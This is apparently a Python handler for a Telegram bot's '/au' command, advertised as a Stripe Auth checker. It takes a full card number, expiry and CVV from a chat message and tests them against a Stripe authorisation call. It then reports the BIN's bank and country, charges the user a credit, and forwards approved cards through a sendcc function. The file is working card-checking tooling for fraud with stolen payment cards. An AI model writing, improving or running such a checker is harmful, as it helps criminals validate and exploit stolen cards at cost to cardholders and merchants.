import httpx
import time
import asyncio
from pyrogram import Client, filters
from FUNC.usersdb_func import *
from FUNC.defs import *
from TOOLS.check_all_func import *
from TOOLS.getbin import *
from .response import *
from .gate import *


@Client.on_message(filters.command("au", [".", "/"]))
async def pp_auth_cmd(Client, message):
    try:
        user_id = str(message.from_user.id)
        checkall = await check_all_thing(Client, message)

        gateway = "Stripe Auth ✅[/au]"

        if checkall[0] == False:
            return

        role = checkall[1]
        getcc = await getmessage(message)
        if getcc == False:
            resp = f"""<b>
𝙂𝙖𝙩𝙚 𝙉𝙖𝙢𝙚: {gateway} ♻️
𝘾𝙈𝘿: /au

𝙈𝙚𝙨𝙨𝙖𝙜𝙚: 𝙉𝙤 𝘾𝘾 𝙁𝙤𝙪𝙣𝙙 𝙞𝙣 𝙮𝙤𝙪𝙧 𝙞𝙣𝙥𝙪𝙩 

𝙐𝙨𝙖𝙜𝙚: /au 𝙘𝙘|𝙢𝙚𝙨|𝙖𝙣𝙤|𝙘𝙫𝙫</𝙗>"""
            await message.reply_text(resp, message.id)
            return

        cc, mes, ano, cvv = getcc[0], getcc[1], getcc[2], getcc[3]
        fullcc = f"{cc}|{mes}|{ano}|{cvv}"

        firstresp = f"""
↯ 𝐂𝐡𝐞𝐜𝐤𝐢𝐧𝐠.

⊗ 𝘾𝙖𝙧𝙙 - <code>{fullcc}</code>
⊗ 𝙎𝙩𝙖𝙩𝙪𝙨 - Checking.
⊗ 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 - ■□□□
</b>
"""
        await asyncio.sleep(0.5)
        firstchk = await message.reply_text(firstresp, message.id)

        secondresp = f"""
↯ 𝐂𝐡𝐞𝐜𝐤𝐢𝐧𝐠..

⊗ 𝘾𝙖𝙧𝙙 - <code>{fullcc}</code>
⊗ 𝙎𝙩𝙖𝙩𝙪𝙨 - Checking.
⊗ 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 - ■■■□
"""
        await asyncio.sleep(0.5)
        secondchk = await Client.edit_message_text(message.chat.id, firstchk.id, secondresp)

        start = time.perf_counter()
        proxies = await get_proxy_format()
        session = httpx.AsyncClient(
            timeout=30)
        result = await create_cvv_auth(fullcc, session)
        getbin = await get_bin_details(cc)
        getresp = await get_charge_resp(result, user_id, fullcc)
        status = getresp["status"]
        response = getresp["response"]

        thirdresp = f"""
↯ 𝐂𝐡𝐞𝐜𝐤𝐢𝐧𝐠...

⊗ 𝘾𝙖𝙧𝙙 - <code>{fullcc}</code>
⊗ 𝙎𝙩𝙖𝙩𝙪𝙨 - Checking.
⊗ 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 - ■■■■
"""
        await asyncio.sleep(0.5)
        thirdcheck = await Client.edit_message_text(message.chat.id, secondchk.id, thirdresp)

        brand = getbin[0]
        type = getbin[1]
        level = getbin[2]
        bank = getbin[3]
        country = getbin[4]
        flag = getbin[5]
        currency = getbin[6]

        finalresp = f"""
<i>{gateway}</i>

<a href=\"tg://user?id=7317502701\">[そ]</a> 𝑪𝒂𝒓𝒅- <code>{fullcc}</code> 
<a href=\"tg://user?id=7317502701\">[ヸ]</a> 𝑺𝒕𝒂𝒕𝒖𝒔- <i>{status}</i>
<a href=\"tg://user?id=7317502701\">[仝]</a> 𝑹𝒆𝒔𝒑𝒐𝒏𝒔𝒆- ⤿ {response} ⤾
━━━━━━━━━━━━━━━━━━━━━━━━━━━━
<a href=\"tg://user?id=7317502701\">[そ]</a> 𝑰𝒏𝒇𝒐- {brand} - {type} - {level}
<a href=\"tg://user?id=7317502701\">[ヸ]</a> 𝑩𝒂𝒏𝒌- {bank} 
<a href=\"tg://user?id=7317502701\">[仝]</a> 𝑪𝒐𝒖𝒏𝒕𝒓𝒚- {country} - {flag} - {currency}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━
<a href=\"tg://user?id=7317502701\">[そ]</a> 𝑻𝒊𝒎𝒆- {time.perf_counter() - start:0.2f} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬
<a href=\"tg://user?id=7317502701\">[ヸ]</a> 𝑪𝒉𝒆𝒄𝒌𝒆𝒅 𝑩𝒚:  <a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a> [ {role} ]
<a href=\"tg://user?id=7317502701\">[〠]</a> 𝑩𝒐𝒕 𝑩𝒚 ➺  <a href=\"tg://user?id=7317502701\">〄 𝙎𝙋𝙔𝙭𝙎𝙋𝙔𝘿𝙀</a>
"""
        await asyncio.sleep(0.5)
        await Client.edit_message_text(message.chat.id, thirdcheck.id, finalresp)
        await setantispamtime(user_id)
        await deductcredit(user_id)
        if status == "𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅" or status == "𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅":
            await sendcc(finalresp, session)
        await session.aclose()

    except:
        import traceback
        await error_log(traceback.format_exc())

        
